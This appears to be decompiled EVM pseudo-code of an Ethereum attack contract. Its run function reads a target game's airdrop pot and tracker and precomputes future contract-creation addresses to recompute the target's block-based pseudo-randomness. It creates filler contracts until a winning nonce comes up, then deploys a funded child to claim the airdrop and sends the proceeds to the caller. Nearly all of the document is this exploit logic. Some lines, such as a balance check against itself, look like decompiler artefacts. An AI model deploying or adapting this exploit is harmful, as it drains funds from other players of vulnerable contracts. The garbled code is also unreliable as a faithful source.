contract main {




// =====================  Runtime code  =====================


uint256 stor0;

function kill() payable {
    require msg.sender == 0x6fae851378b9c1499d4fe9d01895c515365ed9dc
    selfdestruct(0x6fae851378b9c1499d4fe9d01895c515365ed9dc)
}

function _fallback() payable {
    revert
}

function run() payable {
    require ext_code.size(0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c)
    call 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c.airDropPot_() with:
         gas gas_remaining wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    if ext_call.return_data[0] >= 4 * 10^17:
        require ext_code.size(0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c)
        call 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c.airDropTracker_() with:
             gas gas_remaining wei
        if not ext_call.success:
            revert with ext_call.return_data[0 len return_data.size]
        require return_data.size >= 32
        mem[128] = address(block.coinbase)
        mem[96] = 20
        mem[64] = 148
        mem[148 len 0] = None
        mem[148 len 20] = address(block.coinbase, 0)
        require block.timestamp
        s = 0
        s = 0
        idx = 0
        s = stor0
        t = 0
        while idx <= 10:
            require s <= test266151307()
            if 0 >= s:
                u = 1
                v = 0
                while s >= u:
                    u = 256 * u
                    v = v + 1
                    continue 
                if s <= 0:
                    _502 = mem[64]
                    mem[64] = mem[64] + 32
                    mem[_502] = (address(this.address) << 80) + (v + 214 << 248) + (v + 128 << 72) + (s * 256^(-v + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                    _503 = sha3(mem[_502 len v + 23])
                    _506 = mem[64]
                    mem[mem[64] + 32] = address(sha3(mem[_502 len v + 23]))
                    _507 = mem[64]
                    mem[mem[64]] = 20
                    mem[64] = mem[64] + 52
                    _509 = mem[_507]
                    v = _507 + 32
                    w = _506 + 52
                    u = mem[_507]
                    while u >= 32:
                        mem[w] = mem[v]
                        v = v + 32
                        w = w + 32
                        u = u - 32
                        continue 
                    mem[_506 + floor32(mem[_507]) + 52] = mem[_506 + floor32(mem[_507]) + 52] and 256^(-(mem[_507] % 32) + 32) - 1 or mem[_507 + floor32(mem[_507]) + 32] and !(256^(-(mem[_507] % 32) + 32) - 1)
                    require block.timestamp
                    if block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_506 + 52 len _509]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_506 + 52 len _509]) / block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
                        s = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_506 + 52 len _509]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_506 + 52 len _509]) / block.timestamp) / 1000)
                        s = _503
                        idx = idx + 1
                        s = s + 1
                        t = t + 1
                        continue 
                else:
                    if s >= 128:
                        _510 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_510] = (address(this.address) << 80) + (v + 214 << 248) + (v + 128 << 72) + (s * 256^(-v + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                        _511 = sha3(mem[_510 len v + 23])
                        _525 = mem[64]
                        mem[mem[64] + 32] = address(sha3(mem[_510 len v + 23]))
                        _526 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _528 = mem[_526]
                        v = _526 + 32
                        w = _525 + 52
                        u = mem[_526]
                        while u >= 32:
                            mem[w] = mem[v]
                            v = v + 32
                            w = w + 32
                            u = u - 32
                            continue 
                        mem[_525 + floor32(mem[_526]) + 52] = mem[_525 + floor32(mem[_526]) + 52] and 256^(-(mem[_526] % 32) + 32) - 1 or mem[_526 + floor32(mem[_526]) + 32] and !(256^(-(mem[_526] % 32) + 32) - 1)
                        require block.timestamp
                        if block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_525 + 52 len _528]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_525 + 52 len _528]) / block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
                            s = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_525 + 52 len _528]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_525 + 52 len _528]) / block.timestamp) / 1000)
                            s = _511
                            idx = idx + 1
                            s = s + 1
                            t = t + 1
                            continue 
                    else:
                        _512 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_512] = (address(this.address) << 80) + (v + 214 << 248) + (s << 72) + 0x94000000000000000000000000000000000000000000000000000000000000
                        _513 = sha3(mem[_512 len v + 23])
                        _529 = mem[64]
                        mem[mem[64] + 32] = address(sha3(mem[_512 len v + 23]))
                        _530 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _532 = mem[_530]
                        v = _530 + 32
                        w = _529 + 52
                        u = mem[_530]
                        while u >= 32:
                            mem[w] = mem[v]
                            v = v + 32
                            w = w + 32
                            u = u - 32
                            continue 
                        mem[_529 + floor32(mem[_530]) + 52] = mem[_529 + floor32(mem[_530]) + 52] and 256^(-(mem[_530] % 32) + 32) - 1 or mem[_530 + floor32(mem[_530]) + 32] and !(256^(-(mem[_530] % 32) + 32) - 1)
                        require block.timestamp
                        if block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_529 + 52 len _532]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_529 + 52 len _532]) / block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
                            s = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_529 + 52 len _532]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_529 + 52 len _532]) / block.timestamp) / 1000)
                            s = _513
                            idx = idx + 1
                            s = s + 1
                            t = t + 1
                            continue 
            else:
                if s < 128:
                    if s <= 0:
                        _334 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_334] = (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000
                        _336 = mem[64]
                        mem[mem[64] + 32] = address(sha3(Mask(184, 72, (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72))
                        _337 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _339 = mem[_337]
                        v = _337 + 32
                        w = _336 + 52
                        u = mem[_337]
                        while u >= 32:
                            mem[w] = mem[v]
                            v = v + 32
                            w = w + 32
                            u = u - 32
                            continue 
                        mem[_336 + floor32(mem[_337]) + 52] = mem[_336 + floor32(mem[_337]) + 52] and 256^(-(mem[_337] % 32) + 32) - 1 or mem[_337 + floor32(mem[_337]) + 32] and !(256^(-(mem[_337] % 32) + 32) - 1)
                        require block.timestamp
                        if block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_336 + 52 len _339]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_336 + 52 len _339]) / block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
                            s = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_336 + 52 len _339]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_336 + 52 len _339]) / block.timestamp) / 1000)
                            s = sha3(Mask(184, 72, (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72)
                            idx = idx + 1
                            s = s + 1
                            t = t + 1
                            continue 
                    else:
                        if s >= 128:
                            _340 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_340] = (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000
                            _344 = mem[64]
                            mem[mem[64] + 32] = address(sha3(Mask(184, 72, (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72))
                            _345 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _347 = mem[_345]
                            v = _345 + 32
                            w = _344 + 52
                            u = mem[_345]
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            mem[_344 + floor32(mem[_345]) + 52] = mem[_344 + floor32(mem[_345]) + 52] and 256^(-(mem[_345] % 32) + 32) - 1 or mem[_345 + floor32(mem[_345]) + 32] and !(256^(-(mem[_345] % 32) + 32) - 1)
                            require block.timestamp
                            if block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_344 + 52 len _347]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_344 + 52 len _347]) / block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
                                s = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_344 + 52 len _347]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_344 + 52 len _347]) / block.timestamp) / 1000)
                                s = sha3(Mask(184, 72, (address(this.address) << 80) + (s << 64) - 0x296bffffffffffffffffffffffffffffffffffffffff7f000000000000000000) >> 72)
                                idx = idx + 1
                                s = s + 1
                                t = t + 1
                                continue 
                        else:
                            _342 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_342] = (address(this.address) << 80) + (s << 72) - 0x296c000000000000000000000000000000000000000000000000000000000000
                            _348 = mem[64]
                            mem[mem[64] + 32] = address(sha3(Mask(184, 72, (address(this.address) << 80) + (s << 72) - 0x296c000000000000000000000000000000000000000000000000000000000000) >> 72))
                            _349 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _351 = mem[_349]
                            v = _349 + 32
                            w = _348 + 52
                            u = mem[_349]
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            mem[_348 + floor32(mem[_349]) + 52] = mem[_348 + floor32(mem[_349]) + 52] and 256^(-(mem[_349] % 32) + 32) - 1 or mem[_349 + floor32(mem[_349]) + 32] and !(256^(-(mem[_349] % 32) + 32) - 1)
                            require block.timestamp
                            if block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_348 + 52 len _351]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_348 + 52 len _351]) / block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
                                s = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_348 + 52 len _351]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_348 + 52 len _351]) / block.timestamp) / 1000)
                                s = sha3(Mask(184, 72, (address(this.address) << 80) + (s << 72) - 0x296c000000000000000000000000000000000000000000000000000000000000) >> 72)
                                idx = idx + 1
                                s = s + 1
                                t = t + 1
                                continue 
                else:
                    u = 1
                    v = 0
                    while s >= u:
                        u = 256 * u
                        v = v + 1
                        continue 
                    if s <= 0:
                        _504 = mem[64]
                        mem[64] = mem[64] + 32
                        mem[_504] = (address(this.address) << 80) + (v + 214 << 248) + (v + 128 << 72) + (s * 256^(-v + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                        _505 = sha3(mem[_504 len v + 23])
                        _514 = mem[64]
                        mem[mem[64] + 32] = address(sha3(mem[_504 len v + 23]))
                        _515 = mem[64]
                        mem[mem[64]] = 20
                        mem[64] = mem[64] + 52
                        _517 = mem[_515]
                        v = _515 + 32
                        w = _514 + 52
                        u = mem[_515]
                        while u >= 32:
                            mem[w] = mem[v]
                            v = v + 32
                            w = w + 32
                            u = u - 32
                            continue 
                        mem[_514 + floor32(mem[_515]) + 52] = mem[_514 + floor32(mem[_515]) + 52] and 256^(-(mem[_515] % 32) + 32) - 1 or mem[_515 + floor32(mem[_515]) + 32] and !(256^(-(mem[_515] % 32) + 32) - 1)
                        require block.timestamp
                        if block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_514 + 52 len _517]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_514 + 52 len _517]) / block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
                            s = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_514 + 52 len _517]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_514 + 52 len _517]) / block.timestamp) / 1000)
                            s = _505
                            idx = idx + 1
                            s = s + 1
                            t = t + 1
                            continue 
                    else:
                        if s >= 128:
                            _518 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_518] = (address(this.address) << 80) + (v + 214 << 248) + (v + 128 << 72) + (s * 256^(-v + 9)) + 0x94000000000000000000000000000000000000000000000000000000000000
                            _519 = sha3(mem[_518 len v + 23])
                            _533 = mem[64]
                            mem[mem[64] + 32] = address(sha3(mem[_518 len v + 23]))
                            _534 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _536 = mem[_534]
                            v = _534 + 32
                            w = _533 + 52
                            u = mem[_534]
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            mem[_533 + floor32(mem[_534]) + 52] = mem[_533 + floor32(mem[_534]) + 52] and 256^(-(mem[_534] % 32) + 32) - 1 or mem[_534 + floor32(mem[_534]) + 32] and !(256^(-(mem[_534] % 32) + 32) - 1)
                            require block.timestamp
                            if block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_533 + 52 len _536]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_533 + 52 len _536]) / block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
                                s = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_533 + 52 len _536]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_533 + 52 len _536]) / block.timestamp) / 1000)
                                s = _519
                                idx = idx + 1
                                s = s + 1
                                t = t + 1
                                continue 
                        else:
                            _520 = mem[64]
                            mem[64] = mem[64] + 32
                            mem[_520] = (address(this.address) << 80) + (v + 214 << 248) + (s << 72) + 0x94000000000000000000000000000000000000000000000000000000000000
                            _521 = sha3(mem[_520 len v + 23])
                            _537 = mem[64]
                            mem[mem[64] + 32] = address(sha3(mem[_520 len v + 23]))
                            _538 = mem[64]
                            mem[mem[64]] = 20
                            mem[64] = mem[64] + 52
                            _540 = mem[_538]
                            v = _538 + 32
                            w = _537 + 52
                            u = mem[_538]
                            while u >= 32:
                                mem[w] = mem[v]
                                v = v + 32
                                w = w + 32
                                u = u - 32
                                continue 
                            mem[_537 + floor32(mem[_538]) + 52] = mem[_537 + floor32(mem[_538]) + 52] and 256^(-(mem[_538] % 32) + 32) - 1 or mem[_538 + floor32(mem[_538]) + 32] and !(256^(-(mem[_538] % 32) + 32) - 1)
                            require block.timestamp
                            if block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_537 + 52 len _540]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_537 + 52 len _540]) / block.timestamp) / 1000) >= ext_call.return_data[0] + 1:
                                s = block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_537 + 52 len _540]) / block.timestamp) - (1000 * block.timestamp + block.difficulty + (sha3(address(block.coinbase, 0)) / block.timestamp) + block.gas_limit + block.number + (sha3(mem[_537 + 52 len _540]) / block.timestamp) / 1000)
                                s = _521
                                idx = idx + 1
                                s = s + 1
                                t = t + 1
                                continue 
            s = 0
            while s < t:
                create contract with 0 wei
                                code: 13311
                s = s + 1
                continue 
            create contract with 100000000000000000 wei
                            code: code.data[1619 len 269], 0xdd9fd6b6f8f7ea932997992bbe67eabb3e316f3c
            if not create.new_address:
                revert with ext_call.return_data[0 len return_data.size]
            require eth.balance(this.address) < eth.balance(this.address)
            call msg.sender with:
               value eth.balance(this.address) wei
                 gas 2300 * is_zero(value) wei
            if not ext_call.success:
                revert with ext_call.return_data[0 len return_data.size]
            stor0 = t + stor0 + 1
            return 1
    call msg.sender with:
       value eth.balance(this.address) wei
         gas 2300 * is_zero(value) wei
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    else:
        return 0
}



}
